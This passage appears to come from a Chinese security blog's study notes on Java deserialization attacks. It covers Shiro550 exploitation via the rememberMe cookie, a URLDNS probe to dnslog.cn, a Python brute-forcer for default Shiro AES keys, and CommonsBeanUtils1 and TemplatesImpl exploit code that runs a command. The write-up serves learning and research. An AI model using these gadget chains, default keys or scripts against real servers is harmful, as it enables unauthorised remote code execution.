class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap; <span class="comment">//入口类  </span></span><br><span class="line"><span class="keyword">import</span> java.net.URL;  <span class="comment">//调用链中的类  </span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        HashMap &lt;URL,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://c3j32r.dnslog.cn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取到url中的hashcode属性  </span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        <span class="comment">//hashcode为私有属性，通过下面方法设置为可操作  </span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里在put前需要将hashCode值改一下，不然put方法也会请求dns，这样不管有没有反序列化都会请求dns  </span></span><br><span class="line"></span><br><span class="line">        field.set(url,<span class="number">2</span>);  <span class="comment">//重新设，避免混淆  </span></span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        field.set(url,-<span class="number">1</span>);  <span class="comment">//改回，不然这条链就不能利用  </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//进行序列化  </span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">w</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        w.writeObject(hashMap);</span><br><span class="line">        System.out.println(w);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进行反序列化  </span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        o.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后反序列化那里先注释掉，直接序列化得到ser.bin，然后把这个序列化的数据放到加密脚本里面跑得到加密cookie<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125072.png" alt="image-20230717112539038"><br>最后把这段cookie替换掉原来的cookie，主要这里的JSESSIONID这段数据一定要删不然不会去读rememberMe<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125588.png" alt="image-20230717112546537"><br>发包之后收到DNS请求<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125433.png" alt="image-20230717112554385"><br>接下来就是换不同的链尝试攻击</p><h3 id="通过-CC11-链攻击"><a href="#通过-CC11-链攻击" class="headerlink" title="通过 CC11 链攻击"></a>通过 CC11 链攻击</h3><p>还是用之前的CC11链子攻击，先序列化ser.bin然后加密发包就行<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171126559.png" alt="image-20230717112603459"></p><h3 id="通过-CB1-链攻击"><a href="#通过-CB1-链攻击" class="headerlink" title="通过 CB1 链攻击"></a>通过 CB1 链攻击</h3><p>这里需要注意的是CB版本问题，一开始用的exp是之前跟的CB1这条链的时候写的，但是那个CB版本是1.9.2，yso 中的链子也是，而shiro自带为 1.8.3，所以需要把版本更换一下不然服务端就好报如下错误</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.beanutils.BeanComparator; local <span class="keyword">class</span> <span class="title class_">incompatible</span>: stream <span class="type">classdesc</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">2044202215314119608</span>, local <span class="keyword">class</span> <span class="title class_">serialVersionUID</span> = -<span class="number">3490850999041592962</span></span><br></pre></td></tr></table></figure><p>这个<code>serialVersionUID</code>就是Java的一个机制，在Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 <code>serialVersionUID</code> 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 <code>serialVersionUID</code> 不同，则反序列化就会异常退出<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171126521.png" alt="image-20230717112620430"></p><h3 id="AES密钥判断"><a href="#AES密钥判断" class="headerlink" title="AES密钥判断"></a>AES密钥判断</h3><p>这里还有一个问题参考Drunkbaby师傅的描述就是shiro 在 1.4.2 版本之前， AES 的模式为 CBC， IV 是随机生成的，并且 IV 并没有真正使用起来，所以整个 AES 加解密过程的 key 就很重要了，正是因为 AES 使用 Key 泄漏导致反序列化的 cookie 可控，从而引发反序列化漏洞。在 1.4.2 版本后，shiro 已经更换加密模式 AES-CBC 为 AES-GCM，脚本编写时就需要考虑加密模式变化的情况。记得之前用过的飞鸿大佬的一款shiro反序列化利用工具就做了key的爆破，下面是大佬 Veraxy 的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_AES_GCM</span>(<span class="params">msg, secretKey</span>):</span><br><span class="line">    aesCipher = AES.new(secretKey, AES.MODE_GCM)</span><br><span class="line">    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)</span><br><span class="line">    <span class="keyword">return</span> (ciphertext, aesCipher.nonce, authTag)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">target</span>):</span><br><span class="line">    keys = [<span class="string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span>, <span class="string">&#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;</span>,<span class="string">&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;</span>, <span class="string">&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;</span>]     <span class="comment"># 此处简单列举几个密钥</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line"> </span><br><span class="line">    file_body = base64.b64decode(<span class="string">&#x27;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># CBC加密</span></span><br><span class="line">            encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))</span><br><span class="line">            res = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;,timeout=<span class="number">3</span>,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;正确KEY ：&quot;</span> + key)</span><br><span class="line">                <span class="keyword">return</span> key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;正确key:&quot;</span> + key)</span><br><span class="line">                    <span class="keyword">return</span> key</span><br><span class="line">            <span class="comment"># GCM加密</span></span><br><span class="line">            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))</span><br><span class="line">            base64_ciphertext = base64.b64encode(encryptedMsg[<span class="number">1</span>] + encryptedMsg[<span class="number">0</span>] + encryptedMsg[<span class="number">2</span>])</span><br><span class="line">            res = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="number">3</span>, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;正确KEY:&quot;</span> + key)</span><br><span class="line">                <span class="keyword">return</span> key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;正确key:&quot;</span> + key)</span><br><span class="line">                    <span class="keyword">return</span> key</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正确key:&quot;</span> + key)</span><br><span class="line">            <span class="keyword">return</span> key</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B%E4%B9%8B-deserialize-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Java反序列化Shiro篇01-Shiro550流程分析 | Drunkbaby’s Blog (drun1baby.top)</a><br><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&vd_source=fdbccecc8d1a39a2449860e47c52b6e7">白日梦组长</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java学习之CommonsBeanUtils1</title>
      <link href="/undefined/41270.html"/>
      <url>/undefined/41270.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>jdk8<br>依赖如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.9</span><span class="number">.2</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/commons-collections/commons-collections --&gt;  </span></span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/commons-logging/commons-logging --&gt;  </span></span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-logging&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="CommonsBeanUtils的学习"><a href="#CommonsBeanUtils的学习" class="headerlink" title="CommonsBeanUtils的学习"></a>CommonsBeanUtils的学习</h2><p>commons-beanutils 是 Apache 提供的一个用于操作 JavaBean 的工具包。里面提供了各种各样的工具类，让我们可以很方便的对 bean 对象的属性进行各种操作。<br>在JavaBean中我们通常把一组对应的读方法（<code>getter</code>）和写方法（<code>setter</code>）称为属性（<code>property</code>），具体的学习可以参考<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBean - 廖雪峰的官方网站 (liaoxuefeng.com)</a><br>下面是个简单的JavaBean类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBean</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;y0n3er&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Commons-BeanUtils 中提供了一个静态方法 <code>PropertyUtils.getProperty</code> ，让使用者可以直接调用任意 JavaBean 的 getter 方法，示例如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        System.out.println(PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">JavaBean</span>(),<span class="string">&quot;name&quot;</span>));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151118483.png" alt="image-20230715111849205"><br>这种调用方法Commons-BeanUtils 会自动找到 name 属性的getter 方法，也就是 getName ，然后调用并获得返回值，这就容易想到任意函数调用</p><h2 id="CommonsBeanUtils1链子分析"><a href="#CommonsBeanUtils1链子分析" class="headerlink" title="CommonsBeanUtils1链子分析"></a>CommonsBeanUtils1链子分析</h2><p>这里还是从尾部分析，我这样是最简单的，这里后半部分和CC4类似<br>在之前动态加载 TemplatesImpl 字节码的分析中链子如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt;TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>我们再往前是<code>TemplatesImpl.getOutputProperties()</code>，它是一个 getter 方法，并且作用域为 public，所以可以通过 CommonsBeanUtils 中的 <code>PropertyUtils.getProperty()</code> 方式获取，方式如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(TemplatesImpl, <span class="string">&quot;outputProperties&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里的TemplatesImpl在实际调用的时候其实就是TemplatesImpl的对象，然后找到outputProperties属性的getter 方法即<code>getOutputProperties()</code>，然后按照惯例继续往前跟看谁调用了<code>PropertyUtils.getProperty()</code>这里find usages的时候一定要把源码下了，不然找不到，方式就是进入PropertyUtils类中，idea会提示你下载，然后下载就行了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151119777.png" alt="image-20230715111957579"><br>最终找到了<code>compare()</code>方法，然后就是找谁调用了这个方法，但是调用这个方法的类就太多了，所以直接就从大佬的博客搬就行了，最终找到的是<code>PriorityQueue</code> 这个类的 <code>siftDownUsingComparator()</code> 方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151120222.png" alt="image-20230715112028044"><br>然后继续找谁调用了<code>siftDownUsingComparator()</code>，发现在同类下的<code>siftDown()</code>中调用了这个方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151120382.png" alt="image-20230715112042190"><br>然后继续往前找发现同类下的<code>heapify()</code>调用了这个方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151121852.png" alt="image-20230715112129660"><br>然后继续找谁调用了<code>heapify()</code>方法，发现同类下的readObject下调用了，这就和CC4一样，那么到这里整条链子就结束了</p><h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><p>在<code>TemplatesImpl</code>类中还有个<code>TransletClassLoader</code>类继承了<code>ClassLoader</code>类并且重写了<code>defineClass()</code>方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151121071.png" alt="image-20230715112155839"><br>然后我们从<code>TransletClassLoader#defineClass()</code> 向前追溯一下调用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="line"></span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line"></span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p><code>TemplatesImpl#getOutputProperties()</code> 和 <code>TemplatesImpl#newTransformer()</code> ，这两者的作用域是public，可以被外部调用，我们尝试用 <code>TemplatesImpl#newTransformer()</code> 构造一个简单的 exp<br>首先构造字节码，这里的字节码必须继承<code>AbstractTranslet</code>，因为继承了这一抽象类，所以必须要重写一下里面的方法，这里直接借用大佬的字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// TemplatesImpl 的字节码构造  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesBytes</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException&#123;&#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException&#123;&#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TemplatesBytes</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123;  </span><br><span class="line">        <span class="built_in">super</span>();  </span><br><span class="line"> Runtime.getRuntime().exec(<span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字节码结束，接下来就是构造exp，如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进调用链结合exp来分析一步步分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt;  </span><br><span class="line">TemplatesImpl#newTransformer() -&gt;  </span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt;  </span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt;  </span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>首先定义了一个设置私有属性的方法setFieldValue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    field.set(obj, value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个就没啥好分析的代码一看就懂了，然后是下面这行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151122697.png" alt="image-20230715112217461"><br>这里<code>_name</code>不能为空，这样才能继续走下去，再是下面这行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151122476.png" alt="image-20230715112237351"><br>这里<code>_bytecodes</code>也不能为空，其实这里的利用条件就是CC3中一样的，<code>_tfactory</code> 需要是一个 <code>TransformerFactoryImpl</code> 对象，因为 <code>TemplatesImpl#defineTransletClasses()</code> 方法里有调用到 <code>_tfactory.getExternalExtensionsMap()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151122084.png" alt="image-20230715112250939"><br><code>test.class</code>其实就是前面CC3写的一直在用的弹计算器的恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            